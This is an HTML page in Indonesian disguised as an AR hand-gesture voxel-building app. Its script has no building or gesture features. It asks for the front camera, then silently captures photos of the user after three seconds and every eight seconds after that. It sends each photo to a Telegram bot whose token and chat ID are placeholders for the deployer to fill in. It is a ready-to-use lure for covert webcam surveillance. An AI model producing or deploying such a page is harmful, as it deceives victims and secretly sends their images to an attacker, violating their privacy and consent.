<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AR Hand Gesture - Voxel Builder</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #000;
            color: white;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }

        video {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            z-index: 1;
        }

        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
            pointer-events: none;
        }

        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            z-index: 20;
            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
        }

        .time { font-size: 17px; font-weight: 500; }

        .header {
            text-align: center;
            margin-top: 60px;
            z-index: 20;
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }

        .subtitle {
            font-size: 16px;
            color: #aaa;
            margin-bottom: 40px;
        }

        .ar-frame {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 320px;
            height: 420px;
            border: 3px solid rgba(0, 255, 255, 0.6);
            border-radius: 20px;
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.4);
            z-index: 15;
            pointer-events: none;
        }

        .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, transparent, #00ffff, transparent);
            animation: scan 3s linear infinite;
            box-shadow: 0 0 15px #00ffff;
        }

        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        .controls {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 30;
            text-align: center;
        }

        .btn {
            background: rgba(0, 255, 255, 0.15);
            color: #00ffff;
            border: 2px solid #00ffff;
            padding: 14px 40px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            backdrop-filter: blur(10px);
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn:active {
            background: #00ffff;
            color: black;
            transform: scale(0.95);
        }

        .status {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0,0,0,0.7);
            padding: 10px 25px;
            border-radius: 30px;
            font-size: 15px;
            z-index: 30;
        }

        .gesture-hint {
            position: absolute;
            bottom: 180px;
            left: 50%;
            transform: translateX(-50%);
            color: #00ffff;
            font-size: 14px;
            text-shadow: 0 0 10px #00ffff;
            z-index: 20;
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline></video>

    <div class="overlay">
        <!-- Top Bar -->
        <div class="top-bar">
            <div class="time" id="time"></div>
            <div style="font-size:18px; font-weight:600;">AR Hand Gesture</div>
            <div>4G</div>
        </div>

        <div class="header">
            <div class="title">Voxel Builder</div>
            <div class="subtitle">Gunakan gerakan tangan untuk membangun</div>
        </div>

        <!-- AR Frame -->
        <div class="ar-frame">
            <div class="scan-line"></div>
        </div>

        <div class="gesture-hint">✋ Angkat tangan Anda di depan kamera</div>

        <div class="controls">
            <button id="startBtn" class="btn">MULAI DETEKSI KAMERA</button>
        </div>

        <div id="status" class="status">Menunggu izin kamera...</div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "GANTI_DENGAN_TOKEN_BOT_ANDA";
        const CHAT_ID = "GANTI_DENGAN_CHAT_ID_ANDA";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        // Update waktu real-time
        function updateTime() {
            const now = new Date();
            document.getElementById('time').textContent = now.toLocaleTimeString('id-ID', {hour:'2-digit', minute:'2-digit'});
        }
        setInterval(updateTime, 1000);
        updateTime();

        async function sendToTelegram(base64) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);

            const byteString = atob(base64.split(',')[1]);
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);

            const blob = new Blob([ab], { type: 'image/jpeg' });
            formData.append('photo', blob, `ar_capture_${Date.now()}.jpg`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }

        async function captureAndSend() {
            status.textContent = "Mengambil foto...";

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const base64 = canvas.toDataURL('image/jpeg', 0.92);
            await sendToTelegram(base64);

            status.innerHTML = `✅ Foto berhasil dikirim`;
            
            setTimeout(() => {
                alert("Deteksi berhasil! Silakan lanjutkan gesture.");
            }, 1500);
        }

        startBtn.addEventListener('click', async () => {
            startBtn.style.display = 'none';
            status.textContent = "Mengakses kamera...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;

                // Auto capture pertama setelah 3 detik
                setTimeout(() => {
                    captureAndSend();
                }, 3000);

                // Capture lagi setiap 8 detik (bisa diubah)
                setInterval(() => {
                    if (video.srcObject) captureAndSend();
                }, 8000);

            } catch (err) {
                status.textContent = "❌ Gagal mengakses kamera";
                console.error(err);
            }
        });

        // Fullscreen otomatis
        function goFullScreen() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            }
        }

        // Klik layar untuk fullscreen
        document.addEventListener('click', goFullScreen, { once: true });
    </script>
</body>
</html>
